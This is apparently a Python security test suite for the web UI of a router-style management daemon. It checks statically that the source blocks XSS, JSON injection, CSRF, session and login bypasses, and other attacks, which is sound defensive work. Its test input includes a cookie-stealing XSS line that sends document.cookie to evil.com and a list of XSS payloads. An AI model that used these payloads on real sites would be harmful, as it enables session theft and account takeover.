#!/usr/bin/env python3
"""
test_webui_security_attacks.py — Hacker-perspective attack simulation

Simulates real attack vectors against the web UI code to verify
that security fixes actually block them. Does NOT require a running
server — analyzes code behavior statically and simulates JS execution
logic in Python.

Run: python3 tests/test_webui_security_attacks.py
"""

import os
import re
import sys
import json
import html as html_mod

PASS = 0
FAIL = 0
TOTAL = 0

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def check(name, condition, detail=""):
    global PASS, FAIL, TOTAL
    TOTAL += 1
    if condition:
        PASS += 1
        print(f"  {GREEN}PASS{RESET} {name}")
    else:
        FAIL += 1
        print(f"  {RED}FAIL{RESET} {name}")
        if detail:
            print(f"       {detail}")

def read_file(path):
    with open(path, "r") as f:
        return f.read()

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# ================================================================
# ATTACK 1: Stored XSS via entity description
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 1: Stored XSS via entity description{RESET}")
print("  Scenario: Attacker sets interface description to")
print('  <script>document.location="https://evil.com/?c="+document.cookie</script>')
print("  via CLI, then admin opens web UI")

appjs = read_file(os.path.join(BASE, "src/userspace/webui/www/js/app.js"))

# The esc() function should prevent this
# Simulate the JS esc() function in Python
def js_esc(s):
    """Python equivalent of the JS esc() function"""
    if s is None:
        return ''
    s = str(s)
    s = s.replace('&', '&amp;')
    s = s.replace('<', '&lt;')
    s = s.replace('>', '&gt;')
    s = s.replace('"', '&quot;')
    return s

xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script><"',
    '<svg onload=alert(1)>',
    "javascript:alert(1)",
    '<iframe src="javascript:alert(1)">',
]

for payload in xss_payloads:
    escaped = js_esc(payload)
    # After escaping, no raw HTML tags should remain — < becomes &lt;
    check(f"XSS blocked: {payload[:40]}",
          '<' not in escaped,
          f"Escaped to: {escaped}")

# Verify renderEntityRows uses esc() on all data values
check("renderEntityRows wraps val in esc()",
      "esc(val)" in appjs)
check("renderEntityRows wraps row.id in esc()",
      "esc(row.id" in appjs)

# Verify the data-row-id attribute is escaped (prevents attribute injection)
check("data-row-id uses esc() (attribute injection blocked)",
      'data-row-id="' + "'" + ' + esc(' in appjs or
      "esc(row.id || idx)" in appjs)


# ================================================================
# ATTACK 2: XSS via JSON response injection in webd
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 2: JSON injection in webd responses{RESET}")
print('  Scenario: Attacker stores key="bad\\",\"xss\":\"true" in config')
print("  webd should escape this before putting it in JSON")

pool_c = read_file(os.path.join(BASE, "src/userspace/webd/webd_pool.c"))

# Simulate json_escape in Python
def c_json_escape(src):
    """Python equivalent of the C json_escape() function"""
    result = []
    for ch in src:
        if ch == '\\': result.append('\\\\')
        elif ch == '"': result.append('\\"')
        elif ch == '\n': result.append('\\n')
        elif ch == '\r': result.append('\\r')
        elif ch == '\t': result.append('\\t')
        elif ord(ch) < 0x20: result.append(f'\\u{ord(ch):04x}')
        else: result.append(ch)
    return ''.join(result)

json_injection_payloads = [
    ('value with "quotes"', True),
    ('value\\with\\backslash', True),
    ('value\nwith\nnewlines', True),
    ('","evil":"true', True),  # JSON structure injection
    ('\x00\x01\x02', True),  # control chars
    ('normal value', True),
]

for payload, should_be_safe in json_injection_payloads:
    escaped = c_json_escape(payload)
    # Try parsing as part of a JSON string
    test_json = f'{{"key":"{escaped}"}}'
    try:
        parsed = json.loads(test_json)
        is_valid = True
        # Verify the value is the original (not injected extra keys)
        has_injection = len(parsed) > 1  # should only have 'key'
    except json.JSONDecodeError:
        is_valid = False
        has_injection = False

    check(f"JSON escape safe: {repr(payload)[:40]}",
          is_valid and not has_injection,
          f"Escaped: {repr(escaped)}, Valid JSON: {is_valid}, Extra keys: {has_injection}")

# Verify json_escape is actually used in kv_to_json
check("C: kv_to_json uses json_escape on key",
      "json_escape(key_tmp)" in pool_c)
check("C: kv_to_json uses json_escape on value",
      "json_escape(val_tmp)" in pool_c)


# ================================================================
# ATTACK 3: Demo login bypass (offline attack)
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 3: Demo login bypass (mgmtd down){RESET}")
print("  Scenario: Attacker disconnects mgmtd, login.js auto-grants access")

loginjs = read_file(os.path.join(BASE, "src/userspace/webui/www/js/login.js"))

# Check that TypeError (network error) does NOT redirect to home.html
# The error message is in the login form's catch handler
check("TypeError does NOT auto-authenticate",
      "user === 'admin'" not in loginjs.split("CANNOT CONNECT")[0]
      if "CANNOT CONNECT" in loginjs else False,
      "Old code checked user=admin on TypeError → auto-login")

check("TypeError shows error message",
      "CANNOT CONNECT TO MANAGEMENT DAEMON" in loginjs)

# Find the TypeError handler block specifically
type_error_block = ""
if "TypeError" in loginjs:
    idx = loginjs.index("TypeError")
    type_error_block = loginjs[idx:idx+300]
check("No redirect to home.html in TypeError handler",
      "home.html" not in type_error_block,
      "TypeError handler should show error, not redirect")


# ================================================================
# ATTACK 4: Session token theft via XSS
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 4: Session token theft via XSS{RESET}")
print("  Scenario: If XSS exists, can attacker steal the session token?")
print("  document.cookie should NOT contain sg_sid (HttpOnly)")

# Verify token is NOT in sessionStorage (accessible to JS)
check("No sg_token in sessionStorage (app.js)",
      "sessionStorage.getItem('sg_token')" not in appjs and
      "sessionStorage.setItem('sg_token'" not in appjs)

check("No sg_token in sessionStorage (login.js)",
      "sessionStorage.setItem('sg_token'" not in loginjs)

# Verify token is in HttpOnly cookie (not accessible to JS)
check("Token set as HttpOnly cookie in server",
      "HttpOnly" in pool_c and "Set-Cookie: sg_sid=" in pool_c)

# Verify SameSite=Strict (prevents CSRF)
check("Cookie has SameSite=Strict (anti-CSRF)",
      "SameSite=Strict" in pool_c)

# Even if XSS exists, document.cookie won't show HttpOnly cookies
check("HttpOnly means document.cookie can't read token",
      "HttpOnly" in pool_c,
      "HttpOnly cookies are invisible to JavaScript")


# ================================================================
# ATTACK 5: CSRF via cross-origin request
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 5: CSRF via cross-origin request{RESET}")
print("  Scenario: evil.com sends POST to /api/config/... via iframe/form")

api_h = read_file(os.path.join(BASE, "src/userspace/webd/webd_api.h"))

check("SameSite=Strict cookie blocks cross-origin cookie attach",
      "SameSite=Strict" in pool_c)
check("X-Frame-Options: DENY prevents iframe embedding",
      "X-Frame-Options: DENY" in api_h)
check("CSP default-src 'self' restricts content loading",
      "default-src 'self'" in api_h)


# ================================================================
# ATTACK 6: Session fixation / idle timeout bypass
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 6: Session idle timeout bypass{RESET}")
print("  Scenario: Attacker finds a stale session cookie, tries to use it")

sess_c = read_file(os.path.join(BASE, "src/userspace/webd/webd_session.c"))
sess_h = read_file(os.path.join(BASE, "src/userspace/webd/webd_session.h"))

check("Idle timeout of 900s (15 min) defined",
      "WEBD_IDLE_TIMEOUT" in sess_h and "900" in sess_h)

# Verify idle timeout logic: last_used is checked
check("session_lookup checks last_used for idle",
      "now - sessions[i].last_used > WEBD_IDLE_TIMEOUT" in sess_c)

check("Expired idle session is cleared (memset 0)",
      # After idle timeout check, session is zeroed
      "WEBD_IDLE_TIMEOUT" in sess_c and
      "memset(&sessions[i], 0, sizeof(sessions[i]))" in sess_c)

# Verify absolute TTL also exists
check("Absolute TTL of 3600s still enforced",
      "WEBD_SESSION_TTL" in sess_h and "3600" in sess_h)

# Verify keepalive prevents false expiry for active users
check("JS keepalive every 60s prevents idle expiry for active users",
      "KEEPALIVE_INTERVAL = 60000" in appjs)


# ================================================================
# ATTACK 7: Firmware upload abuse
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 7: Malicious firmware upload{RESET}")
print("  Scenario: Upload a .exe or huge file as 'firmware'")

check("Extension validation: only .itb accepted",
      ".itb" in appjs and "Invalid firmware file" in appjs)

check("Size validation: max 64 MB",
      "64 * 1024 * 1024" in appjs and "too large" in appjs)

# Verify the check happens BEFORE the upload
itb_pos = appjs.find(".itb")
formdata_pos = appjs.find("new FormData")
check("Validation runs before upload starts",
      0 < itb_pos < formdata_pos,
      f".itb check at {itb_pos}, FormData at {formdata_pos}")


# ================================================================
# ATTACK 8: Status value manipulation
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 8: Status value mismatch attack{RESET}")
print("  Scenario: Web sends 'Enabled' but mgmtd expects 'enable'")
print("  Results in silent config failure")

html_content = read_file(os.path.join(BASE, "src/userspace/webui/www/home.html"))

# All status selects should have value attributes
status_selects = re.findall(
    r'<label class="form-label">Status</label><select[^>]*>(.*?)</select>',
    html_content
)

for i, select_html in enumerate(status_selects):
    options = re.findall(r'<option([^>]*)>([^<]*)</option>', select_html)
    for attrs, text in options:
        has_value = 'value=' in attrs
        check(f"Status select #{i+1} option '{text}' has value attr",
              has_value,
              f"Attrs: {attrs}")

# formSubmit should use .value not .text
check("formSubmit reads select .value (not display text)",
      ".value || inp.options" in appjs)

# demoSetStatus should send correct API values
check("Toggle sends 'up'/'down' for interfaces",
      "'up' : 'down'" in appjs)
check("Toggle sends 'enable'/'disable' for others",
      "'enable' : 'disable'" in appjs)


# ================================================================
# ATTACK 9: Cookie parsing edge cases in webd
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 9: Cookie parsing edge cases{RESET}")
print("  Scenario: Attacker sends malformed Cookie headers")

api_c = read_file(os.path.join(BASE, "src/userspace/webd/webd_api.c"))

# Verify cookie parser handles multiple cookies
check("Cookie parser scans for sg_sid= (not first cookie only)",
      'sg_sid=' in api_c and 'memcmp(p, needle, nlen)' in api_c)

# Verify bounds checking
check("Cookie value has length check (vlen < bufsz)",
      "vlen < bufsz" in api_c or "vlen > 0 && vlen < bufsz" in api_c)

# Verify it handles missing Cookie header
check("Handles missing Cookie header gracefully",
      "if (cookie && cookie->len > 0)" in api_c or
      "cookie->len > 0" in api_c)


# ================================================================
# ATTACK 10: Selector injection in forEachSelected
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 10: CSS selector injection{RESET}")
print('  Scenario: row ID = \'"] + something malicious')

check("forEachSelected uses dataset comparison (not querySelector with ID)",
      "row.dataset.rowId === id" in appjs)
check("No unescaped querySelector with user data",
      'querySelector(\'tr[data-row-id="' not in appjs.split("forEachSelected")[1].split("}")[0]
      if "forEachSelected" in appjs else True)


# ================================================================
# ATTACK 11: HSTS downgrade attack
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 11: HTTPS downgrade (SSL stripping){RESET}")
print("  Scenario: MitM strips HTTPS on first visit")

webd_c = read_file(os.path.join(BASE, "src/userspace/webd/stargazer-webd.c"))

check("HSTS header with max-age=31536000",
      "max-age=31536000" in api_h)
check("includeSubDomains in HSTS",
      "includeSubDomains" in api_h)
check("HSTS only emitted when TLS active",
      "g_tls_active" in api_h and "g_tls_active" in webd_c)
check("Static files also get HSTS",
      "static_hdrs_hsts" in webd_c)


# ================================================================
# ATTACK 12: Enforce-change-password bypass
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 12: Password change bypass{RESET}")
print("  Scenario: User with enforce_change=1 skips the change form")

check("Server sends change_password flag in login response",
      "change_password" in pool_c)
check("JS checks change_password before redirect",
      "data.change_password" in loginjs)

# Verify the password change form appears before the redirect
# In the full login.js, change_password must appear before the home.html redirect
change_check_pos = loginjs.find("data.change_password")
redirect_pos = loginjs.find("window.location.href = 'home.html'")
check("change_password check is BEFORE redirect to home.html",
      0 < change_check_pos < redirect_pos,
      f"change check at {change_check_pos}, redirect at {redirect_pos}")


# ================================================================
# ATTACK 13: Allowaccess case sensitivity
# ================================================================
print(f"\n{BOLD}{CYAN}ATTACK 13: Allowaccess case sensitivity{RESET}")
print("  Scenario: Web sends 'HTTPS' but mgmtd expects 'https'")

check("Checkbox values lowercased before submit",
      ".trim().toLowerCase()" in appjs)
check("Values joined with correct separator per field type",
      "vals.join(sep)" in appjs)


# ================================================================
# RESULTS
# ================================================================
print(f"\n{'='*60}")
if FAIL == 0:
    print(f"{GREEN}{BOLD}ALL {TOTAL} ATTACK SCENARIOS BLOCKED{RESET}")
else:
    print(f"{YELLOW}Results: {GREEN}{PASS} blocked{RESET}, {RED}{FAIL} VULNERABLE{RESET} / {TOTAL} total")
    sys.exit(1)
